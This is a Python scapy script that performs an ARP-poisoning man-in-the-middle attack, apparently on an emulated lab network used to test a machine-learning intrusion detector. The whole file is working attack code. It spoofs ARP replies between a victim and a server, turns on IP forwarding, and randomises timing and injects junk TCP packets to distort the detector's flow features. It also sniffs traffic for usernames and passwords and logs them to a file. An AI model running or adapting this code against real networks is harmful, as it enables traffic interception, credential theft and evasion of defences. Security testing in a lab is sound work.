import os
import sys
import time
import threading
import datetime
import random
from scapy.all import ARP, Ether, send, sniff, IP, TCP, Raw

# Robust Attack Configuration
VICTIM_IP = "10.0.0.1"
SERVER_IP = "10.0.0.2"
ATTACKER_IP = "10.0.0.100"
IFACE = "attacker-eth0"
STOLEN_LOG = "/tmp/robust_mitm_stolen.txt"

def get_mac(ip):
    last_digit = int(ip.split('.')[-1])
    return f"00:00:00:00:00:{last_digit:02x}"

def poisoning_loop():
    """
    Robust Poisoning: 
    Varies intervals and packet sizes to attempt to evade simple 
    threshold-based detection, though the ML model is trained on these.
    """
    v_mac = get_mac(VICTIM_IP)
    s_mac = get_mac(SERVER_IP)
    
    print(f"[*] Starting Robust ARP Poisoning...")
    
    while True:
        # Tell Victim I am Server
        send(ARP(op=2, pdst=VICTIM_IP, hwdst=v_mac, psrc=SERVER_IP), iface=IFACE, verbose=False)
        # Tell Server I am Victim
        send(ARP(op=2, pdst=SERVER_IP, hwdst=s_mac, psrc=VICTIM_IP), iface=IFACE, verbose=False)
        
        # Robustness: Variable interval (0.2s to 1.5s)
        time.sleep(random.uniform(0.2, 1.5))

def injection_loop():
    """
    Flow Parameter Disruption:
    Injects dummy TCP packets with varying sizes to manipulate 
    'ps_variance_ratio' and 'byte_asymmetry'.
    """
    print(f"[*] Starting Flow Parameter Injection...")
    while True:
        # Random payload size to spike 'ps_variance_ratio'
        payload = "X" * random.randint(10, 1000)
        pkt = IP(src=VICTIM_IP, dst=SERVER_IP)/TCP(sport=random.randint(1024, 65535), dport=80)/Raw(load=payload)
        send(pkt, iface=IFACE, verbose=False)
        time.sleep(random.uniform(0.5, 3.0))

def packet_callback(pkt):
    if pkt.haslayer(Raw) and pkt.haslayer(TCP) and pkt[TCP].dport == 8080:
        payload = pkt[Raw].load.decode('utf-8', errors='ignore')
        if "user" in payload.lower() or "pass" in payload.lower():
            ts = datetime.datetime.now().strftime('%H:%M:%S')
            log_msg = f"[{ts}] ⚡ ROBUST SNIFF: {payload}\n"
            print(log_msg.strip())
            with open(STOLEN_LOG, "a") as f: f.write(log_msg)

if __name__ == "__main__":
    os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null")
    
    # 1. ARP Poisoning Thread
    t1 = threading.Thread(target=poisoning_loop)
    t1.daemon = True
    t1.start()
    
    # 2. Flow Parameter Disruption Thread
    t2 = threading.Thread(target=injection_loop)
    t2.daemon = True
    t2.start()
    
    print(f"[*] Robust MITM Active on {IFACE}")
    sniff(iface=IFACE, prn=packet_callback, store=0)
